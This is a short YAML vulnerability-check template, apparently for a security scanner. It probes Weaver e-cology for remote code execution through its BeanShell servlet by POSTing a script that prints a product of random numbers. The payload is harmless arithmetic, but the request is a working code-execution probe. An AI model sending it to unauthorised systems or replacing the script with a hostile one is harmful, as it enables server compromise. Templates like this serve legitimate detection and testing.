detail:
  author: l1nk3r
  links:
  - https://www.weaver.com.cn/cs/securityDownload.asp
expression: r0()
manual: true
name: poc-yaml-ecology-javabeanshell-rce
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      * r2)))
    request:
      body: bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
      cache: true
      follow_redirects: false
      method: POST
      path: /weaver/bsh.servlet.BshServlet
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
transport: http
